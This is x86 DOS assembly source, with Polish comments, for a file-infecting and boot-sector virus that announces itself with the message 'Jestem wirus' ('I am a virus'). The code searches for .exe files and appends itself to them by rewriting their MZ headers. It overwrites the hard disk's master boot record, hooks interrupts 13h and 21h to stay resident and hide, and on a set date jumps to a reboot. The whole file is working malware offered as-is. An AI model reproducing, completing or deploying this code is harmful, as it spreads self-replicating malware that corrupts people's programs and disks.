format mz
entry main:start

EKRAN_SEGMENT equ 0b800h
P13H_DYSK_C equ 0080h
P13H_SEKTOR_ODCZYTAJ equ 0200h
P13H_SEKTOR_ZAPISZ equ 0300h
P21H_P_BUFOR_ADRES_POBIERZ equ 2fh
P21H_P_DATA_CZAS_POBIERZ equ 5700h
P21H_P_DATA_CZAS_ZAPISZ equ 5701h
P21H_PLIK_SZUKAJ_MASKA equ 4eh
P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
P21H_PLIK_OTWORZ equ 3d02h
P21H_PLIK_ODCZYTAJ equ 3f00h
P21H_PLIK_ZAPISZ equ 4000h
P21H_PLIK_ZAMKNIJ equ 3eh
P21H_PLIK_WSKAZNIK_PRZESUN equ 4200h
P21H_PLIK_WSKAZNIK_POCZATEK equ 00h
P21H_PLIK_WSKAZNIK_KONIEC equ 02h
P21H_ZAMKNIJ equ 4c00h
P21H_TEKST_$_WYPISZ equ 9h

PLIK_NAZWA_OFS equ 1eh
PLIK_ROZMIAR_OFS equ 4h
P_NAGLOWEK_ROZMIAR_OFS equ 8h
P_POCZATEK_SEGMENT_OFS equ 16h
P_POCZATEK_OFFSET_OFS equ 14h
PLIK_NAGLOWEK_DLUGOSC equ 20h
PLIK_TYP equ 'MZ'
ZARAZONY_MASKA equ 0ffh

P12H_SEGMENT equ 4ah
P12H_OFFSET equ 48h
P13H_SEGMENT equ 4eh
P13H_OFFSET equ 4ch
P1CH_SEGMENT equ 72h
P1CH_OFFSET equ 70h
P21H_SEGMENT equ 86h
P21H_OFFSET equ 84h
P21H_ADRES_POBIERZ equ 2500h

segment main

tablica_partycji_poczatek:
  xor ax, ax
  mov ss, ax
  mov sp, 7c00h
  int 12h
  mov cl, 6h
  shl ax, cl
  mov cx, 100h
  sub ax, cx
  mov [adres], ax
; odczytanie dalszej części wirusa
  mov dx, P13H_DYSK_C
  mov cx, 2h
  mov es, ax
  mov bx, 0h
  mov ax, (P13H_SEKTOR_ODCZYTAJ or 6h)
  int 13h
  mov ax, [adres]
  push ax
  mov ax, czesc_inicjujaca
  push ax
  retf
adres dw ?
tablica_partycji_koniec:
czesc_inicjujaca:
  mov ax, cs
  mov ss, ax
  mov ds, ax
  mov sp, bufor + 100h
; odczytanie pierwotnej zawartości sektora pierwszego
  mov dx, P13H_DYSK_C
  mov cx, 9h
  xor ax, ax
  mov es, ax
  mov bx, 7c00h
  push es
  push bx
  mov ax, (P13H_SEKTOR_ODCZYTAJ or 1h)
  int 13h
; wyprowadzenie tekstu na ekran
  push ds
  push ax
  mov ax, EKRAN_SEGMENT
  mov ds, ax
  mov al, 'A'
  mov [0], al
  mov al, 1eh
  mov [1], al
  pop ax
  pop ds
  ;call przerwanie_1ch_podmiana
  ;call przerwanie_12h_podmiana
  retf

P21H_HASLO equ 0ffffh
P21H_ODZEW equ 0aaaah

przerwanie_1ch_podmiana:
  push ds
  push es
  mov cx, cs
  mov ds, cx
  xor dx, dx
  mov es, dx
  mov [licznik], 0h
  mov ax, [es:P1CH_OFFSET]
  mov [przerwanie_1ch_offset], ax
  mov word [es:P1CH_OFFSET], przerwanie_1ch_obsluga
  mov ax, [es:P1CH_SEGMENT]
  mov [przerwanie_1ch_segment], ax
  mov [es:P1CH_SEGMENT], cx
  mov ax, [es:P21H_OFFSET]
  mov word [przerwanie_21h_adres], ax
  mov ax, [es:P21H_SEGMENT]
  mov word [przerwanie_21h_adres + 2h], ax
  pop es
  pop ds
  ret

przerwanie_12h_podmiana:
  push ds
  push es
  mov cx, cs
  mov ds, cx
  xor dx, dx
  mov es, dx
  mov ax, [es:P12H_OFFSET]
  mov word [przerwanie_12h_adres], ax
  mov word [es:P12H_OFFSET], przerwanie_12h_obsluga
  mov ax, [es:P12H_SEGMENT]
  mov word [przerwanie_12h_adres + 2h], ax
  mov [es:P12H_SEGMENT], cx
  pop es
  pop ds
  ret

przerwanie_12h_adres dd ?
przerwanie_12h_obsluga:
  pushf
  cli
; wywołanie pierwotnej procedury przerwania 12h - pobranie ilości pamięci
  call [cs:przerwanie_12h_adres + 2h]
  sti
; zarezerwowanie fragmentu pamięci od końca
  sub ax, 4h
  cli
  iret

przerwanie_1ch_offset dw ?
przerwanie_1ch_segment dw ?
licznik dw 0h
opoznienie equ 100h
przerwanie_1ch_obsluga:
  push ax
  push bx
  push dx
  push ds
  push es
  mov ax, cs
  mov ds, ax
  mov ax, licznik
  inc ax
  cmp ax, opoznienie
  jge zmiana
  mov [licznik], ax
  jmp przerwanie_1ch_obsluga_koniec
zmiana:
  mov ah, 2ah
  int 21h
  cmp dx, 060eh
  jne zmien_adresy
  ;call kodowanie
  ;call dezaktywacja
  mov ax, 0ffffh
  push ax
  mov ax, 0h
  push ax
  retf
zmien_adresy:
  mov ah, 34h
  int 21h
  mov ah, [es:bx]
  or ah, ah
  jnz przerwanie_1ch_obsluga_koniec
  call przerwania_adresy_zmien
  mov ax, cs
  mov ds, ax
  mov dx, przerwanie_1ch_offset
  mov ax, przerwanie_1ch_segment
  mov ds, ax
  mov ax, (P21H_ADRES_POBIERZ or 1ch)
  int 21h
przerwanie_1ch_obsluga_koniec:
  pop es
  pop ds
  pop dx
  pop bx
  pop ax
  iret

przerwania_adresy_zmien:
  sti
  push ax
  push bx
  push cx
  push dx
  push ds
  push es
; sprawdzenie czy adresy zostały już zmienione
  mov ax, P21H_HASLO
  int 21h
  cmp ax, P21H_ODZEW
  je p_adresy_zmien_koniec
  mov cx, cs
  mov ds, cx
  xor dx, dx
  mov es, dx
  mov ax, [es:P13H_OFFSET]
  mov word [przerwanie_13h_adres], ax
  mov word [es:P13H_OFFSET], przerwanie_13h_obsluga
  mov ax, [es:P13H_SEGMENT]
  mov word [przerwanie_13h_adres + 2h], ax
  mov [es:P13H_SEGMENT], cx
  mov ax, [es:P21H_OFFSET]
  mov word [przerwanie_21h_adres], ax
  mov word [es:P21H_OFFSET], przerwanie_21h_obsluga
  mov ax, [es:P21H_SEGMENT]
  mov word [przerwanie_21h_adres + 2h], ax
  mov [es:P21H_SEGMENT], cx
p_adresy_zmien_koniec:
  pop es
  pop ds
  pop dx
  pop cx
  pop bx
  pop ax
  cli
  ret

przerwania_przechwycenie:
  push ds
  push es
  mov bx, plik_koniec - tablica_partycji_poczatek
  mov cl, 4h
  shr bx, cl
  inc bx
  mov ax, ds
  mov es, ax
  mov ax, [es:2h]
  sub ax, bx
  mov [es:2h], ax
  push ax
  mov ax, es
  dec ax
  mov es, ax
  mov ax, [es:3h]
  sub ax, bx
  mov [es:3h], ax
  pop ax
pamiec_przydzielona:
  push ax
  mov bx, cs
  mov ds, bx
  mov es, ax
  mov di, tablica_partycji_poczatek
  mov si, tablica_partycji_poczatek
  mov cx, plik_koniec + 10h
  cld
  rep movsb
  mov ax, skok_po_przeniesieniu_w_pamieci
  push ax
  retf
skok_po_przeniesieniu_w_pamieci:
  call przerwania_adresy_zmien
koniec_przechwytywania_przerwan:
  pop es
  pop ds
  ret

przerwanie_21h_adres dd ?
licznik_zarazen db 0h
przerwanie_21h_obsluga:
  sti
  push ax
  push bx
  push cx
  push dx
  push si
  push di
  push ds
  push es
  pushf
; sprawdzenie ile plików już zarażono
  cmp ah, 0eh
  jne p1
  mov al, [licznik_zarazen]
  inc al
  and al, 7fh
  mov [licznik_zarazen], al
  cmp al, 0h
  jne p1
  call plik_zarazenie
  jmp przerwanie_21h_obsluga_koniec
p1:
  cmp ax, P21H_HASLO
  jne przerwanie_21h_obsluga_koniec
  popf
  pop es
  pop ds
  pop di
  pop si
  pop dx
  pop cx
  pop bx
  pop ax
  mov ax, P21H_ODZEW
  cli
  iret
przerwanie_21h_obsluga_koniec:
  popf
  pop es
  pop ds
  pop di
  pop si
  pop dx
  pop cx
  pop bx
  pop ax
  cli
  jmp [cs:przerwanie_21h_adres + 2h]

przerwanie_13h_adres dd ?
przerwanie_13h_obsluga:
  sti
  pushf
  cmp ah, 2h
  jne przerwanie_13h_obsluga_koniec
  cmp dh, 0h
  jne przerwanie_13h_obsluga_koniec
  cmp dl, 0h
  je przerwanie_13h_obsluga_koniec
  cmp dl, 1h
  je przerwanie_13h_obsluga_koniec
  cmp cx, 1h
  jne przerwanie_13h_obsluga_koniec
  mov cx, 9h
przerwanie_13h_obsluga_koniec:
  popf
  cli
  jmp [cs:przerwanie_13h_adres + 2h]

;segment dane
plik_poczatek_ip dw ?
plik_poczatek_cs dw ?
plik_maska db "*.exe", 0
plik_uchwyt dw ?
plik_data dw ?
plik_czas dw ?
plik_dlugosc_seg dw ?
plik_dlugosc_ofs dw ?
plik_naglowek dw ?
bufor: times 200h db ?

informacja db "Jestem wirus ]:> $"

; wykonywane po uruchomieniu programu
plik_poczatek:
  push ds
  push es
; miejsce na psoty
  call tablica_partycji_zarazenie
  call plik_zarazenie
  mov dx, cs
  mov ds, dx
  mov ah, P21H_TEKST_$_WYPISZ
  mov dx, informacja
  int 21h
; skok do pierwotnego początku programu
  mov dx, cs
  mov ds, dx
  mov ax, [plik_poczatek_cs]
  mov bx, [plik_poczatek_ip]
  pop es
  pop ds
  mov cx, ds
  add ax, cx
  add ax, 10h
  push ax
  push bx
  retf

; zarażanie
plik_zarazenie:
  push ax
  push bx
  push cx
  push dx
  push ds
  push es
  pushf
  mov dx, cs
  mov ds, dx

  mov ah, P21H_PLIK_SZUKAJ_MASKA
  mov dx, plik_maska
  mov cx, 0fh
  int 21h
; jc - nie znaleziono
  jc plik_zarazenie_koniec

plik_znaleziono:
  mov ah, P21H_P_BUFOR_ADRES_POBIERZ
  int 21h
  mov cx, es
  mov ds, cx
  mov dx, bx
  add dx, PLIK_NAZWA_OFS
  mov ax, P21H_PLIK_OTWORZ
  int 21h
  mov cx, cs
  mov ds, cx
  mov bx, ax
  mov [plik_uchwyt], ax
; sprawdzenie czy plik jest już zarażony
  mov ax, P21H_P_DATA_CZAS_POBIERZ
  int 21h
  cmp cl, ZARAZONY_MASKA
  jne do_zarazenia
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
  int 21h
  jnc plik_znaleziono
  jmp plik_zarazenie_koniec
  
do_zarazenia:
  mov cl, ZARAZONY_MASKA
  mov [plik_data], dx
  mov [plik_czas], cx
; pobranie długości pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov [plik_dlugosc_seg], dx
  mov [plik_dlugosc_ofs], ax
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
  int 21h
  mov dx, bufor
  mov cx, PLIK_NAGLOWEK_DLUGOSC
  mov ax, P21H_PLIK_ODCZYTAJ
  int 21h
  cmp word [bufor], PLIK_TYP
  jne plik_oznacz
; zapisanie nowego rozmiaru pliku
  mov ax, plik_koniec
  mov cl, 9h
  shr ax, cl
  and ax, 1ffh
  mov cx, ax
  mov ax, word [bufor + PLIK_ROZMIAR_OFS]
  add ax, cx
  inc ax
  mov word [bufor + PLIK_ROZMIAR_OFS], ax
; zapamiętanie rozmiaru nagłówka
  mov ax, word [bufor + P_NAGLOWEK_ROZMIAR_OFS]
  mov [plik_naglowek], ax
; zapamiętanie segmentu pierwotnego początku programu
  mov ax, word [bufor + P_POCZATEK_SEGMENT_OFS]
  mov [plik_poczatek_cs], ax
; sprawdzenie długości pliku, jeśli zbyt długi to rezygnacja
  mov ax, [plik_dlugosc_seg]
  cmp ax, 02h
  jg plik_oznacz
; zapisanie segmentu nowego początku programu
  mov cl, 0ch
  shl ax, cl
  and ax, 0f000h
  mov dx, ax
  mov ax, [plik_dlugosc_ofs]
  mov cl, 04h
  shr ax, cl
  and ax, 0fffh
  add ax, dx
  mov dx, [plik_naglowek]
  sub ax, dx
  inc ax
  mov word [bufor + P_POCZATEK_SEGMENT_OFS], ax
; zapamiętanie offsetu pierwotnego początku programu
  mov ax, word [bufor + P_POCZATEK_OFFSET_OFS]
  mov [plik_poczatek_ip], ax
; zapisanie offsetu nowego początku programu
  mov ax, plik_poczatek
  mov word [bufor + P_POCZATEK_OFFSET_OFS], ax
; zapisanie uaktualnionego nagłówka pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_POCZATEK)
  int 21h
  mov dx, bufor
  mov cx, PLIK_NAGLOWEK_DLUGOSC
  mov ax, P21H_PLIK_ZAPISZ
  int 21h
; dopisanie wirusa na koniec pliku
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov ax, [plik_dlugosc_ofs]
  and ax, 000fh
  mov cx, 0fh
  cmp ax, 0h
  je plik_dopisz_wirusa
  sub cx, ax
plik_dopisz_wirusa:
  inc cx
  mov dx, tablica_partycji_poczatek
  mov ax, P21H_PLIK_ZAPISZ
  int 21h
  xor cx, cx
  xor dx, dx
  mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
  int 21h
  mov dx, tablica_partycji_poczatek
  mov ax, plik_koniec
; wyrównanie długości pliku do 512
  mov cl, 9h
  shr ax, cl
  inc ax
  shl ax, cl
  mov cx, ax
  mov ax, P21H_PLIK_ZAPISZ
  int 21h

plik_oznacz:
; oznaczenie pliku jako zarażony
  mov cx, [plik_czas]
  mov dx, [plik_data]
  mov ax, P21H_P_DATA_CZAS_ZAPISZ
  int 21h
  mov ah, P21H_PLIK_ZAMKNIJ
  int 21h
  
plik_zarazenie_koniec:
  popf
  pop es
  pop ds
  pop dx
  pop cx
  pop bx
  pop ax
  ret

tablica_partycji_zarazenie:
  push ds
  push es
; odczytanie pierwszego sektora dysku
  mov dx, P13H_DYSK_C
  mov cx, 1h
  mov ax, cs
  mov es, ax
  mov bx, bufor
  mov ax, (P13H_SEKTOR_ODCZYTAJ or 1h)
  int 13h
; sprawdzenie czy tablica partycji została już zarażona
  mov ax, cs
  mov ds, ax
  mov es, ax
  mov si, bufor
  mov di, tablica_partycji_poczatek
  cld
  mov cx, 18h
  rep cmpsb
  je t_partycji_zarazenie_koniec
; zapisanie pierwszego sektora w sektorze dziewiątym
  mov dx, P13H_DYSK_C
  mov cx, 9h
  mov ax, cs
  mov es, ax
  mov bx, bufor
  mov ax, (P13H_SEKTOR_ZAPISZ or 1h)
  int 13h
; zapisanie wirusa w buforze
  mov cx, tablica_partycji_koniec - tablica_partycji_poczatek
  mov ax, cs
  mov ds, ax
  mov es, ax
  mov si, tablica_partycji_poczatek
  mov di, bufor
  cld
  rep movsb
; zapisanie wirusa w sektorze pierwszym
  mov dx, P13H_DYSK_C
  mov cx, 1h
  mov ax, cs
  mov es, ax
  mov bx, bufor
  mov ax, (P13H_SEKTOR_ZAPISZ or 1h)
  int 13h
; zapisanie dalszej części wirusa w kolejnych sektorach
  mov dx, P13H_DYSK_C
  mov cx, 2h
  mov ax, cs
  mov es, ax
  mov bx, tablica_partycji_poczatek
  mov ax, (P13H_SEKTOR_ZAPISZ or 6h)
  int 13h
t_partycji_zarazenie_koniec:
  pop es
  pop ds
  ret

plik_koniec:

start:
  ;call tablica_partycji_zarazenie
  call plik_zarazenie
  mov dx, cs
  mov ds, dx
  mov ah, P21H_TEKST_$_WYPISZ
  mov dx, informacja
  int 21h
; oczekiwanie na wciśnięcie klawisza
  mov ah, 0h
  int 16h
  mov ax, P21H_ZAMKNIJ
  int 21h

stack 100h
